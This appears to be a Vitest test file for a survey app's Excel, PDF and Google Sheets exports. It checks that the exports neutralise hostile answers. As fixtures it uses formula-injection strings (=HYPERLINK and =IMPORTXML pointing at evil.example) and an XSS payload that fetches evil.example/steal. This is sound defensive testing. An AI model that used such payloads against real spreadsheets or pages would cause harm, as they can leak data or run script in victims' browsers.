import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import ExcelJS from 'exceljs';
import type { FastifyInstance } from 'fastify';
import { encryptSecret } from '../src/lib/crypto';
import { prisma } from '../src/lib/prisma';
import { redis } from '../src/lib/redis';
import { readMockMailbox } from '../src/services/mail';
import { closeBrowser } from '../src/services/exports/pdf';
import { TEST_PASSWORD, answerIdFor, buildWorld, makeApp, replyMsg, resetAll, say, templateBtn, textMsg, type Client, type World } from './helpers';

let app: FastifyInstance;
beforeAll(async () => { app = await makeApp(); });
afterAll(async () => { await closeBrowser(); await app.close(); await prisma.$disconnect(); redis.disconnect(); });
beforeEach(async () => { await resetAll(); });
afterEach(() => { vi.unstubAllGlobals(); });

async function complete(w: World, idx: number, free = 'Faster delivery please') {
  const [q1, q2] = w.questions;
  await say(app, w, idx, (f) => templateBtn(f, `START:${w.surveyId}`));
  await say(app, w, idx, (f) => replyMsg(f, answerIdFor(q1!, idx % 3), 'button_reply'));
  await say(app, w, idx, (f) => replyMsg(f, answerIdFor(q2!, idx % 4), 'list_reply'));
  await say(app, w, idx, (f) => textMsg(f, free));
}

describe('Excel export', () => {
  it('has Summary / Raw responses / Didn\'t start sheets, one row per participant, and neutralises formulas', async () => {
    const w = await buildWorld(app, { contacts: 4 });
    await complete(w, 0, '=HYPERLINK("http://evil.example","click")');
    await complete(w, 1);
    await say(app, w, 2, (f) => templateBtn(f, `START:${w.surveyId}`)); // started, not finished

    const res = await w.owner.raw('GET', `/api/surveys/${w.surveyId}/export/excel`);
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toContain('spreadsheetml');
    expect(res.headers['content-disposition']).toMatch(/surveyflow-Customer-Satisfaction-\d{4}-\d{2}-\d{2}\.xlsx/);

    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(res.rawBody as never);
    expect(wb.worksheets.map((s) => s.name)).toEqual(['Summary', 'Raw responses', "Didn't start"]);

    const raw = wb.getWorksheet('Raw responses')!;
    expect(raw.rowCount).toBe(1 + 3); // header + completed×2 + started×1
    const header = (raw.getRow(1).values as string[]).slice(1);
    expect(header.slice(6)).toEqual(['Q1. How satisfied are you with our service?', 'Q2. Which product do you use most?', 'Q3. Any suggestions for improvement?']);
    const cells: ExcelJS.Cell[] = [];
    raw.eachRow((row) => row.eachCell((c) => cells.push(c)));
    const evil = cells.find((c) => String(c.value).startsWith('=HYPERLINK'))!;
    expect(evil).toBeTruthy();
    expect(evil.type).toBe(ExcelJS.ValueType.String); // stored as text, never a formula

    const summary = wb.getWorksheet('Summary')!;
    const kv = new Map<string, unknown>();
    summary.eachRow((r) => kv.set(String(r.getCell(1).value), r.getCell(2).value));
    expect(kv.get('Invitations sent')).toBe(4);
    expect(kv.get('Completed')).toBe(2);
    expect(kv.get('Started')).toBe(3);

    const nonStart = wb.getWorksheet("Didn't start")!;
    expect(nonStart.rowCount).toBe(1 + 1); // the 4th contact never replied
  });
});

describe('PDF export', () => {
  it('renders a real PDF with Chromium + Chart.js, even when answers contain hostile HTML', async () => {
    const w = await buildWorld(app, { contacts: 3 });
    await complete(w, 0, '<script>fetch("http://evil.example/steal")</script><img src=x onerror=alert(1)>');
    await complete(w, 1);

    const requests: string[] = [];
    // any attempt by the page to reach the network would be aborted by the interceptor; we assert the result is still a good PDF
    const res = await w.owner.raw('GET', `/api/surveys/${w.surveyId}/export/pdf`);
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toBe('application/pdf');
    expect(res.rawBody.subarray(0, 5).toString()).toBe('%PDF-');
    expect(res.rawBody.length).toBeGreaterThan(20_000);
    expect(requests).toEqual([]);

    // The report HTML must carry the hostile string escaped, not as markup.
    const { buildReportHtml } = await import('../src/services/exports/pdf');
    const { computeAnalytics } = await import('../src/services/analytics');
    const html = buildReportHtml(await computeAnalytics(w.surveyId, w.owner.userId), [{ name: '<b>x</b>', phone: '1', status: 'completed', completedAt: null, cells: ['<script>alert(1)</script>'] }], ['q'], 'Biz <i>Co</i>');
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
    expect(html).toContain('Biz &lt;i&gt;Co&lt;/i&gt;');
  }, 90_000);
});

describe('Google Sheets sync', () => {
  /** Turning auto-sync on needs "confirm it is you" at any size (SEC-20). */
  const confirmIdentity = (c: Client) => c.post('/api/auth/step-up', { method: 'password', secret: TEST_PASSWORD });
  function stubGoogle() {
    const calls: Array<{ url: string; body: any }> = [];
    vi.stubGlobal('fetch', vi.fn(async (input: any, init?: any) => {
      const url = String(input instanceof URL ? input.href : input);
      const body = init?.body && typeof init.body === 'string' && init.body.startsWith('{') ? JSON.parse(init.body) : init?.body;
      calls.push({ url, body });
      if (url.startsWith('https://oauth2.googleapis.com/token')) return new Response(JSON.stringify({ access_token: 'at-1', expires_in: 3600 }), { status: 200 });
      if (url === 'https://sheets.googleapis.com/v4/spreadsheets') return new Response(JSON.stringify({ spreadsheetId: 'SID1', spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/SID1' }), { status: 200 });
      if (url.includes('/values/Responses!A1:append')) return new Response(JSON.stringify({ updates: {} }), { status: 200 });
      return new Response('{}', { status: 404 });
    }));
    return calls;
  }
  const appends = (calls: Array<{ url: string; body: any }>) => calls.filter((c) => c.url.includes(':append') || c.url.includes('append?'));

  it('creates the sheet once, appends completed rows with RAW input, never duplicates, and streams new completions', async () => {
    const w = await buildWorld(app, { contacts: 4, plan: 'growth' });
    await prisma.googleConnection.create({ data: { userId: w.owner.userId, email: 'jp@example.com', refreshToken: encryptSecret('refresh-token-1') } });
    await complete(w, 0, '=IMPORTXML("http://evil.example","//a")');
    await complete(w, 1);
    const calls = stubGoogle();
    await confirmIdentity(w.owner);

    const first = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
    expect(first).toMatchObject({ status: 200, enabled: true, autoSync: true, spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/SID1', rowsSynced: 2 });
    expect(calls.filter((c) => c.url === 'https://sheets.googleapis.com/v4/spreadsheets')).toHaveLength(1);
    const a1 = appends(calls);
    expect(a1.length).toBeGreaterThanOrEqual(2);
    expect(a1.every((c) => c.url.includes('valueInputOption=RAW'))).toBe(true); // USER_ENTERED would execute =IMPORTXML(...)
    const rows = a1.flatMap((c) => c.body.values as string[][]);
    expect(rows[0]![0]).toBe('Name'); // header
    expect(rows).toHaveLength(1 + 2);

    // syncing again appends nothing new
    const before = appends(calls).length;
    await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
    expect(appends(calls).length).toBe(before);

    // a new completion flows in "in real time" via auto-sync
    await complete(w, 2);
    await vi.waitFor(() => expect(appends(calls).length).toBe(before + 1));
    expect(appends(calls).at(-1)!.body.values).toHaveLength(1);
    const state = await w.owner.get(`/api/surveys/${w.surveyId}/sync`);
    expect(state).toMatchObject({ enabled: true, autoSync: true });
  });

  it('auto-sync off: completions are not pushed', async () => {
    const w = await buildWorld(app, { contacts: 2, plan: 'growth' });
    await prisma.googleConnection.create({ data: { userId: w.owner.userId, refreshToken: encryptSecret('rt') } });
    const calls = stubGoogle();
    await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: false });
    const before = appends(calls).length;
    await complete(w, 0);
    await new Promise((r) => setTimeout(r, 200));
    expect(appends(calls).length).toBe(before);
  });

  it('turning auto-sync on needs "confirm it is you" at any size; a one-off sync of a small survey does not (SEC-20)', async () => {
    const w = await buildWorld(app, { contacts: 2, plan: 'growth' });
    await prisma.googleConnection.create({ data: { userId: w.owner.userId, email: 'jp@example.com', refreshToken: encryptSecret('refresh-token-1') } });
    stubGoogle();
    const refused = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
    expect(refused).toMatchObject({ status: 403, error: 'step_up_required' });
    expect(await prisma.sheetSync.count()).toBe(0);
    expect((await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: false })).status).toBe(200);
    await confirmIdentity(w.owner);
    const on = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
    expect(on).toMatchObject({ status: 200, autoSync: true, autoSyncActive: true, autoSyncPaused: false });
    expect(new Date(on.autoSyncConfirmedUntil).getTime() - Date.now()).toBeGreaterThan(29 * 86_400_000);
    expect(await prisma.auditLog.count({ where: { action: 'sheets_autosync_confirmed', userId: w.owner.userId } })).toBe(1);
  });

  it('auto-sync pauses SHEETS_AUTOSYNC_DAYS after the last confirmation: new rows wait, the owner is told once, and the next confirmation sends what is missing (SEC-20)', async () => {
    const w = await buildWorld(app, { contacts: 3, plan: 'growth' });
    await prisma.googleConnection.create({ data: { userId: w.owner.userId, email: 'jp@example.com', refreshToken: encryptSecret('refresh-token-1') } });
    const email = (await prisma.user.findUniqueOrThrow({ where: { id: w.owner.userId } })).email;
    const calls = stubGoogle();
    await confirmIdentity(w.owner);
    await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
    const base = appends(calls).length;

    await complete(w, 0);
    await vi.waitFor(() => expect(appends(calls).length).toBe(base + 1)); // inside the window rows flow

    await prisma.sheetSync.updateMany({ data: { autoSyncConfirmedAt: new Date(Date.now() - 31 * 86_400_000) } }); // the window has passed
    await complete(w, 1);
    await complete(w, 2);
    await vi.waitFor(async () => expect((await readMockMailbox(email)).filter((m) => m.kind === 'sheets_sync_paused')).toHaveLength(1));
    expect(appends(calls).length).toBe(base + 1); // nothing was pushed
    expect((await readMockMailbox(email)).filter((m) => m.kind === 'sheets_sync_paused')).toHaveLength(1); // once per pause, not once per completion
    expect(await prisma.auditLog.count({ where: { action: 'sheets_autosync_paused', userId: w.owner.userId } })).toBe(1);
    expect(await w.owner.get(`/api/surveys/${w.surveyId}/sync`)).toMatchObject({ enabled: true, autoSync: true, autoSyncActive: false, autoSyncPaused: true });

    // confirming again resumes it and sends the two rows that waited
    const back = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
    expect(back).toMatchObject({ status: 200, autoSyncActive: true, autoSyncPaused: false });
    expect(appends(calls).length).toBe(base + 2);
    expect(appends(calls).at(-1)!.body.values).toHaveLength(2);
    expect((await prisma.sheetSync.findFirstOrThrow()).autoSyncPausedAt).toBeNull();
  });

  it('asks to reconnect when Google revoked access', async () => {
    const w = await buildWorld(app, { contacts: 1, plan: 'growth' });
    await prisma.googleConnection.create({ data: { userId: w.owner.userId, refreshToken: encryptSecret('rt') } });
    await confirmIdentity(w.owner);
    vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({ error: 'invalid_grant', error_description: 'Token has been expired or revoked.' }), { status: 400 })));
    const r = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
    expect(r).toMatchObject({ status: 409, error: 'google_reauth_required' });
  });
});
